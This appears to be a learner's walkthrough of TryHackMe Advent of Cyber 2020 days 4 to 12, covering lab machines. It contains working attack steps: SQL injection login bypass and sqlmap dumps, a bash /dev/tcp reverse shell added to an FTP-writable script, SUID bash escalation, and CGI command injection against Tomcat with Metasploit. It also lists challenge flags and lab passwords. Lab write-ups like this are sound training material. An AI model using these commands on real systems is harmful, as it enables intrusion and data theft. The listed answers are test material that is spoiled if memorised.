----

# Day 4 -  Santa's watching [Gobuster, wfuzz]

## [Gobuster](http://manpages.ubuntu.com/manpages/cosmic/man1/gobuster.1.html)

- wordlist : /usr/share/wordlist

- wordlist used : /usr/share/wordlist/dirb/big.txt

`gobuster dir -u http://example.com -w wordlist.txt -x php,txt,html`

## [wfuzz](https://manpages.debian.org/buster/wfuzz/wfuzz.1.en.html)

`wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt localhost:80/FUZZ/note.txt`

`wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hw 57 localhost:80/FUZZ/note.txt`

`--hw 57` suggests to hide all pages that have 57 words on them

- **Action 1**
  using `gobuster dir -u http://10.10.161.119 -w /usr/share/wordlists/dirb/big.txt` found:
  
  > ```
  > /.htaccess (Status: 403)
  > /.htpasswd (Status: 403)
  > /LICENSE (Status: 200)
  > /api (Status: 301)
  > /server-status (Status: 403)
  >
  > ``` 

- **Action 2**
  
  navigating to `http://10.10.161.119/api` in the browser I found `/site-log.php`

- **Action 3**
  
  using `wfuzz -c -z file,wordlist -d "date=FUZZ" -u  http://10.10.161.119/api/site-log.php` found a response :

  > `^M000000026:ESC[0m   ESC[32m200     ESC[0m   0 L   ESC[0m   1 W     ESC[0m   13 Ch    ESC[0m   "20201125"`
  
  which means in responce for "20201125" I received 1 W(word) or 13 Ch(characters), besides `wordlist` is the list of 
  dates formatted with YYYYMMDD
  
  using 'curl http://10.10.161.119/api/site-log.php?date=20201125' I received a key which is indeed 13 characters long


## Challenges Ans:

1. `wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ`

2. `site-log.php`

3. THM{D4t3_AP1}

----

# Day 5 - Someone stole Santa's gift list! [SQLi, sqlmap]

## Experiments

- **Action**

  started up gobuster on `10.10.100.16:8000` which was not needed LOL.
  whille gobuster was running on `big.txt` looked at hint and got the santas login panel by just guessing

- **Action**

  fired up `10.10.100.16:8000` on the browser and logged into santa's admin pannel by using a simple SQLi `' or true --`

- **Action**

  tried a lot of SQLi querries I failed to understand the database server being used and what version of it.

- **Action**

  There was a search bar where I can search by gift names. There too I listed all the values in the table(luckyly it wasn't too long)
  by the same SQLi `' or true --`.

  From it I got 22 rows of data and Paul's wish. There was only 2 colums there which I came to know by using `ORDER BY 1,2,3,....`
  and I got back a result saying `error : 3rd ORDER BY term out of range - should be between 1 and 2`

- **Action**

  trying SQLMap didn't understand any thing
  
  used burpsuit to capture request for both to login to santas panel(POST) and gift search query(GET). Saved thouse into files.
  used the files into `sqlmap` with `--tamper=space2comment` got some output but can't understand it. Getting HELP

- **Action**

  okey database server was `sqlite`(given info)
  running sqlmap on gift request file using `sqlmap -r request --tamper=space2comment --dump-all --dbms sqlite` 
  and saved it in a file.
  
  Well it has everithing I need. 

- **NOTE**
  
  - I was wrong about 2 columns cuz there was three for the gifts(kids,age,title)

  - sqlmap saves the database dumps in `/home/<usrname>/.local/share/sqlmap/output/<target-machine-ip>/dump/<database_name>/<table_name>.csv`

## Challenges Ans

1. santa's login pannel :  `/santapanel`

2. no ans needed

3. No. ofentries in the DB : `22`

4. Paul asked for : `Github Ownweship`
 
5. flag : `thmfox{All_I_Want_for_Christmas_Is_You}`

6. admin password : `EhCNSWzzFP6sc7gB`

----

# Day 6 - Be careful with what you wish on a Christmas night [XSS, OWASP ZAP]

## Experiments

- **Action**
  
  fired up `http://10.10.151.94:5000` in the browser and searched for a wish
  it appends `?q="wish"` at the end

- **Action**
  
  opened OWASP ZAP(zed attack proxy) and did an automatic scan on `http://10.10.151.94:5000`
  found vulnerabilities by navigting to `Alerts` tab after the scan was complete
  
- **Action**
  
  tried to inject XSS into the website successfully
  
  
## Challenged Ans

1. vulnerability type was used to exploit the application - Stored cross-site scripting

2. query string can be abused to craft a reflected XSS? - q

3. launch the OWASP ZAP Application - No answer needed

4. how many XSS alerts are in the scan? - 3

5. were you able to make an alert appear on the "Make a wish" website? - No answer needed 

----

# Day 7 - The Grinch Really Did Steal Christmas[WireShark]

## Challeng Ans

1. "pcap1.pcap" in Wireshark. What is the IP address that initiates an ICMP/ping? 
    - 10.11.3.2
	- used filter `icmp.resp_in` which filters out ping `request` packets(see more `icmp.resp_to`)

2. If we only wanted to see HTTP GET requests in our "pcap1.pcap" file, what filter would we use?
    - `http.request.method == GET`

3. Now apply this filter to "pcap1.pcap" in Wireshark, what is the name of the article that the IP address "10.10.67.199" visited?
    - reindeer-of-the-week
    - `471	64.222360	10.10.67.199	10.10.15.52	HTTP	365	GET /posts/reindeer-of-the-week/ HTTP/1.1 `

4. analysing "pcap2.pcap". Look at the captured FTP traffic; what password was leaked during the login process?
    - plaintext_password_fiasco
    - filter `ftp.request.arg`
    - filter `tcp.port == 21` > follow -> tcp stream`
    ```
    20	7.866325	10.10.73.252	10.10.122.128	FTP	83	Request: USER elfmcskidy
    28	14.282063	10.10.73.252	10.10.122.128	FTP	98	Request: PASS plaintext_password_fiasco
    ```

5. Continuing with our analysis of "pcap2.pcap", what is the name of the protocol that is encrypted?
    - ssh
    - Example : 
    ```
    190	63.905280	10.10.122.128	10.11.3.2	SSHv2	110	Server: Encrypted packet (len=56)
    191	63.923720	10.11.3.2	10.10.122.128	SSHv2	142	Client: Encrypted packet (len=88)
    ```



6. Analyse "pcap3.pcap" and recover Christmas!

   What is on Elf McSkidy's wishlist that will be used to replace Elf McEager?
    - Rubber ducky
    - filtering `http.request.method == GET` found a nice packet requesting `chiristmas.zip` 
    `291	26.537049	10.10.53.219	10.10.21.210	HTTP	215	GET /christmas.zip HTTP/1.1`
    - exported that file 
    - unziped it 
    - less `elf_mcskidy_wishlist.txt`


Note:
1. use filter
2. follow a packet
3. export download files

----

# Day 8: What's Under the Christmas Tree? [nmap]

## Experiments:

just trying out diffirent options to scan the machine

- sudo nmap -A <ip> -A: Enable OS detection, version detection, script scanning, and traceroute

- sudo nmap -o <ip> -O: Enable OS detection

- sudo nmap -p <port(s)> <ip>

- sudo nmap -p- <start_port-end_port> <ip>

- sudo nmap -Pn <ip> -Pn: Treat all hosts as online -- skip host discovery

- sudo nmap -sV <ip> -sV: Probe open ports to determine service/version info

- sudo nmap -sV -sC <ip> -sC: equivalent to --script=default

## Challenge Ans

1. When was snort created ? - 1998

2. Using nmap on 10.10.221.85, what was the port numbers of the three servces running ? - 80,2222,3389

    ```
    PORT     STATE SERVICE       VERSION
    80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
    2222/tcp open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    3389/tcp open  ms-wbt-server xrdp
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```

3. Run a scan and provide the -Pn flag to ignore ICMP being used to determine if the host is up

4. Experiment with different scan settings such as-A and -sV whilst comparing the outputs given.

5. Use Nmap to determine the name of the Linux distribution that is running, what is reported as the most likely distribution to be running? - ubuntu

6. Use Nmap's Network Scripting Engine (NSE) to retrieve the "HTTP-TITLE" of the webserver. Based on the value returned, what do we think this website might be used for? - blog 
    - `sudo nmap -sC -sV <ip>`

7. Now use different scripts against the remaining services to discover any further information about them.

***NOTE***
See more : `Supply Chain Exploit`, IDS, IPS

----

# Day 9 - Anyone can be Santa! [FTP]

1.  `ftp 10.10.143.226` - username - `anonymous`

2.  `get public/backup.sh`

3.  to get a reverse shell on bash tcp added a line to the executable:
    `bash -i >& /dev/tcp/<my-ip>/4242 0>&1`
    
4.  listen for incomming traffic using netcat :
    `nc -lvnp 4242`
    
5.  upload the edited file in the same dir using `put`

6.  got a reverse shell back on the netcat listner. cat paste the `flag.txt`
    
## Challenges Ans

1.  Name the directory on the FTP server that has data accessible by the "anonymous" user - `public`
    
2.  What script gets executed within this directory? - `backup.sh`

3.  What movie did Santa have on his Christmas shopping list? - `The Polar Express`

4.  Output the contents of /root/flag.txt! - `THM{even_you_can_be_santa}`

----

# day 10 -Day 10: Don't be so sElfish[smb, enum4linux]

target_ip : 10.10.124.74

-	**Action 1**
	
	looking at the help text for `enum4linux` using : `enum4linux -h`


-	**Action 2 - userlist**
	
	finding user list in smb using : 	`enum4linux -U <target_ip>`
	found 
	
	```
	user:[elfmcskidy] rid:[0x3e8]
	user:[elfmceager] rid:[0x3ea]
	user:[elfmcelferson] rid:[0x3e9]
	```


-	**Action 3 - shares**

	finding shared folders in SMB with : `enum4linux -S <target_ip>`

	```
	Sharename       Type      Comment
	---------       ----      -------
	tbfc-hr         Disk      tbfc-hr
	tbfc-it         Disk      tbfc-it
	tbfc-santa      Disk      tbfc-santa
	IPC$            IPC       IPC Service (tbfc-smb server (Samba, Ubuntu))
	```

-	**Action 4 - logging in as SMB client**

	from the logs of `enum4linux` I can find :

	```
	[+] Attempting to map shares on <target_ip>
		//<target_ip>/tbfc-hr  Mapping: DENIED, Listing: N/A
		//<target_ip>/tbfc-it  Mapping: DENIED, Listing: N/A
		//<target_ip>/tbfc-santa       Mapping: OK, Listing: OK
		//<target_ip>/IPC$     [E] Can't understand response:
	```

	from which I can tell `//<target_ip>/tbfc-santa` doesn't reuqire passwd

	Anyway I tried to access all the shares with random password or no password using : `smbclient //<target_ip>/<sharename>`

		//<target_ip>/tbfc-hr - gave me NT_STATUS_ACCESS_DENIED
		//<target_ip>/tbfc-it - gave me NT_STATUS_ACCESS_DENIED  
		//<target_ip>/tbfc-santa - logged in without any passwd
		//<target_ip>/IPC$ - logged in without any passwd


-	**Action 5**

	well `/IPC$` was filled with void, so I considered to look at `tbfc-santa`
	found one directory(`/jingle-tunes`) and a text file(`note_from_mcskidy.txt`) there.


## Challenges Ans:

1.	Using enum4linux, how many users are there on the Samba server (<target_ip>)? - `3`

2.	Now how many "shares" are there on the Samba server? - `4`

3.	Use smbclient to try to login to the shares on the Samba server (<target_ip>). What share doesn't require a password? - `tbfc-santa`

4.	Log in to this share, what directory did ElfMcSkidy leave for Santa?- `jingle-tunes`


## NOTE:

- see more - password spring

----

# Day 11 - The Rogue Gnome[enumeration, linEnum, linpeas, prevEsc]

target_ip : 10.10.206.228

**Action 1**

 logged into target using given password of cmnatic. 

**Action 2 - doing unnecessary things**

 copied LinEnum.sh, linpeas.sh to /tmp.  using :
	- for receiver `nc -l -p 4444 > expected_file`
 	- for sender `nc -w 3 <receiver_ip> 4444 < expected_file`

 	and set as a executable

**Action 3 - doing unnecessary things**

 What I should have done after running LinEnum or linpeas:(which i think is not nessary for this room)

   - Determining the kernel of the machine (kernel exploitation such as Dirtyc0w) 

   - Locating other services running or applications installed that may be abusable (SUID & out of date software)

   - Looking for automated scripts like backup scripts (exploiting crontabs)

   - Credentials (user accounts, application config files..)

   - Mis-configured file and directory permissions


**Action 4 - find commands with SUID set**
 `find / 	- sudoers-perm -u=s -type f 2>/dev/null` logged it in suid_set.txt
 Found bunch of commands in it but `bash` is enough


**Action 5 - [GTFObins](https://gtfobins.github.io/)**
 found suid exploit for bash: `bash -p` and got root access


## Challenges Ans

 1.	What type of privilege escalation involves using a user account to execute commands as an administrator?
 	- Vertical

 2.	What is the name of the file that contains a list of users who are a part of the sudo group?
	- sudoers

 3.	Use SSH to log in to the vulnerable machine like so: ssh cmnatic@MACHINE_IP
 	Input the following password when prompted: aoc2020

 4.	Enumerate the machine for executables that have had the SUID permission set. Look at the output and use a mixture of GTFObins and your researching skills to learn how to exploit this binary.

	You may find uploading some of the enumeration scripts that were used during today's task to be useful.
	- Did LinEnum and linpeas (not needed for the answering questions)

 5.	Use this executable to launch a system shell as root.

	What are the contents of the file located at /root/flag.txt?
	- thm{2fb10afe933296592}


***NOTE :*** 
-	Eternalblue,
-	/var/log/auth.log" (Attempted logins for SSH, changes too or logging in as system users:)
-	"/var/log/syslog" (System events such as firewall alerts:)
-	"/var/log/<service>/" For example, the access logs of apache2 /var/log/apache2/access.log"

----

#﻿ Day 12: Ready, set, elf.[CGI, Metasploit]

target: 10.10.36.221

**Action 0 - nmap**

	normal nmap scan(-sC -sV -O -Pn -T4) revealed open ports : 

	PORTS  		    SERVICE 	  VERSION
	- 3389/tcp open ms-wbt-server Microsoft Terminal Services
	- 8009 		    ajp13         Apache Jserv (Protocol v1.3)
	- 8080 		    http-proxy    Apache Tomcat 9.0.17
	- 5357/tcp open  wsdapi?

	Windows; CPE: cpe:/o:microsoft:windows also it is given in challeng that it is "Windows machine"

**Action 1 namap vuln**

	vuln script scan(--script vuln) revealed it is LIKELY VULNERABLE to Slowloris attack[CVE:CVE-2007-6750]

**Action 2 - vulnerable**

	Found Apache Tomcat 9.0.17 is vulnerable to CGI attack [CVE-2019-0232](https://www.cvedetails.com/cve/CVE-2019-0232/)

**Action 3 - flag**

	it was given that :
	> "To solve Elf McSkidy's problem with the elves slacking in the workshop, he has created the CGI script: elfwhacker.bat"
	
	so excuting `http://10.10.36.221:8080/cgi-bin/elfwhacker.bat?&dir` got to list the cotents of the directory

	there was the file `flag1.txt` and displayed the content of the file by : 
	http://10.10.36.221:8080/cgi-bin/elfwhacker.bat?&type+flag1.txt

**Action 4 - metaspolit**
	
	- searching for the exploit `use CVE_no`

	- setting lhosts(listning host), rhost(target), and ports on both(dont need to be same), and the targeturi `/cgi-bin/<binary>`

	- run

	- failed


**Action 5 - metaspolit 2nd try**

  - searching for the exploit `use CVE_no`

  - setting lhosts(listning host), rhost(target), set lport to `4004`, and the targeturi `/cgi-bin/<binary>`

  - run `exploit`

  - SUCCESSFULL

  - user id : TBFC-WEB-01\elfmcskidy (`getuid`)

  - OS : Windows 2016+ (10.0 Build 17763) on x64 platform. (`sysinfo`)

  - priviledges of current user : 
    ```
    SeBackupPrivilege
    SeChangeNotifyPrivilege
    SeCreateGlobalPrivilege
    SeCreatePagefilePrivilege
    SeCreateSymbolicLinkPrivilege
    SeDebugPrivilege
    SeImpersonatePrivilege
    SeIncreaseBasePriorityPrivilege
    SeIncreaseQuotaPrivilege
    SeIncreaseWorkingSetPrivilege
    SeLoadDriverPrivilege
    SeManageVolumePrivilege
    SeProfileSingleProcessPrivilege
    SeRemoteShutdownPrivilege
    SeRestorePrivilege
    SeSecurityPrivilege
    SeShutdownPrivilege
    SeSystemEnvironmentPrivilege
    SeSystemProfilePrivilege
    SeSystemtimePrivilege
    SeTakeOwnershipPrivilege
    SeTimeZonePrivilege
    SeUndockPrivilege
    ```
  - checking for if we'er in VM: This is a VMware Virtual Machine (`run post/windows/gather/checkvm`)

  - to check if prev esc is posssible(`run post/multi/recon/local_exploit_suggester`)
    Found two vulnerabilities :
    ```
    [+] <target> - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
    [+] <target> - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
    ``` 

  - [CVE-2020-1048](https://attackerkb.com/topics/QoQvwrIqEV/cve-2020-1048-windows-print-spooler-elevation-of-privilege-vulnerability?referrer=search#vuln-details) - Windows Print Spooler Elevation of Privilege Vulnerability

**Action 6**
  - just `migrate`ing to `spoolsv.exe` gave me the system priviledge
  - checked using `get uid` which produced output `Server username: NT AUTHORITY\SYSTEM`

## Challenges Ans

1.	What is the version number of the web server? 
	- 9.0.17 

2.	What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX)
	- CVE-2019-0232

3.	Set your Metasploit settings appropriately and gain a foothold onto the deployed machine.

5.	What are the contents of flag1.txt? 
	- thm{whacking_all_the_elves}

6.	Looking for a challenge? Try to find out some of the vulnerabilities present to escalate your privileges!



***NOTE***
learn Metaspolit

----

# Day 13 - Coal for Christmas 
